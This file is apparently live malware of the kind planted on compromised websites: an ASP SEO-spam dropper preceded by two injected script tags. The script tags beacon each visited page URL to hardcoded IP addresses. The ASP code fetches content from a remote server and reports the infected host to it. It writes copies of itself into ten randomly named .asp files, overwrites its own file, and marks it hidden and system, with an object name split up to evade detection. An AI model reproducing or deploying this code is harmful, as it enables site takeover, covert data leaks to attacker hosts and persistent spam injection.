<script>var x=new XMLHttpRequest();x.open("GET","http://185.86.150.37/info.php?h="+encodeURIComponent(document.location.href),false);x.send(null);</script><script>var x=new XMLHttpRequest();x.open("GET","http://176.102.34.165/info.php?h="+encodeURIComponent(document.location.href),false);x.send(null);</script><%
Remote_server="http://wb.a1x2.com/"
directory_Number=5
Server.ScriptTimeOut=100
papers_1=getCode(Rand(3,5))
papers_2=getCode(Rand(3,5))
papers_3=getCode(Rand(3,5))
papers_4=getCode(Rand(3,5))
papers_5=getCode(Rand(3,5))
papers_6=getCode(Rand(3,5))
papers_7=getCode(Rand(3,5))
papers_8=getCode(Rand(3,5))
papers_9=getCode(Rand(3,5))
papers_10=getCode(Rand(3,5))
papers=papers_1&"."&papers_2&"."&papers_3&"."&papers_4&"."&papers_5&"."&papers_6&"."&papers_7&"."&papers_8&"."&papers_9&"."&papers_10
fn = Request.ServerVariables("SCRIPT_NAME") 
fn = Mid(fn,InStrRev(fn,"/")+1) 

NewFile_content=a(fn)

host_name=replace("http://"&request.servervariables("HTTP_HOST")&request.servervariables("script_name"),fn,"")
Remote_papers = Remote_server&"/papers.asp"&"?type="&fn&"&host="&host_name&"&directory="&papers&".seoer"
Content_papers=getHTTPPage(Remote_papers)
Content_mb=getHTTPPage(Remote_server)

papers= Split(papers,".")

for i=0 to (ubound(papers))

WriteIn server.mappath("./"&papers(i)&".asp"),NewFile_content

Next

WriteIn Server.MapPath("./")&"\"&fn,Content_mb
response.write Content_mb

Set fso = Server.CreateObject("S"&"cr"&"ip"&"ti"&"ng.Fi"&"le"&"Sys"&"tem"&"Ob"&"je"&"ct")
set f=fso.Getfile(Server.MapPath(Request.ServerVariables("Script_Name")))
if f.attributes <> 7 then
f.attributes = 7
end if

%>

<%
Function getCode(iCount)
     Dim arrChar
     Dim j,k,strCode
     arrChar = "012qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM3456789"
     k=Len(arrChar)
     Randomize
     For i=1 to iCount
          j=Int(k * Rnd )+1
          strCode = strCode & Mid(arrChar,j,1)
     Next
     getCode = strCode
End Function

Function Digital(iCount)
     Dim arrChar
     Dim j,k,strCode
     arrChar = "0123456789"
     k=Len(arrChar)
     Randomize
     For i=1 to iCount
          j=Int(k * Rnd )+1
          strCode = strCode & Mid(arrChar,j,1)
     Next
     Digital = strCode
End Function
Function sj_int(ByVal min, ByVal max) 
		Randomize(Timer) : sj_int = Int((max - min + 1) * Rnd + min)
End Function


Function Rand(ByVal min, ByVal max)  
		Randomize(Timer) : Rand = Int((max - min + 1) * Rnd + min)
End Function
%>

<%
function WriteIn(testfile,msg)
  set fs=server.CreateObject("scripting.filesystemobject")  
  set thisfile=fs.CreateTextFile(testfile,True)  
  thisfile.Write(""&msg& "")  
  thisfile.close  
  set fs = nothing
end function
%>

<%
function a(t)
	set fs=server.createobject("scripting.filesystemobject")
	file=server.mappath(t)
	set txt=fs.opentextfile(file,1,true)
	if not txt.atendofstream then
	   a=txt.ReadAll
	end if
     set fs=nothing
     set txt=nothing
end function
%>

<%
Function CFolder(Filepath)
  Filepath=server.mappath(Filepath)
  Set Fso = Server.CreateObject("Scripting.FileSystemObject")
  If Fso.FolderExists(FilePath) Then
    CFolder=0
  else
    Fso.CreateFolder(FilePath)
    CFolder=1
  end if
  Set Fso = Nothing
end function
%>

<%
Function getHTTPPage(url) 
On Error Resume Next 
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.send() 
if Http.readystate<>4 then 
exit function 
end if 
getHTTPPage=bytesToBSTR(Http.responseBody,"gb2312") 
set http=nothing 
If Err.number<>0 then 
Response.Write "<p align='center'><font color='red'><b>服务器获取文件内容出错</b></font></p>" 
Err.Clear 
End If 
End Function 

Function BytesToBstr(body,Cset) 
dim objstream 
set objstream = Server.CreateObject("adodb.stream") 
objstream.Type = 1 
objstream.Mode =3 
objstream.Open 
objstream.Write body 
objstream.Position = 0 
objstream.Type = 2 
objstream.Charset = Cset 
BytesToBstr = objstream.ReadText 
objstream.Close 
set objstream = nothing 
End Function 
%> 

<%
Function GetHtml(url)
	Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
	ObjXMLHTTP.Open "GET",url,False
	ObjXMLHTTP.setRequestHeader "User-Agent","aQ0O010O"
	ObjXMLHTTP.send
	GetHtml=ObjXMLHTTP.responseBody
	Set ObjXMLHTTP=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "gb2312"
	GetHtml = objStream.ReadText
	objStream.Close
End Function
%>
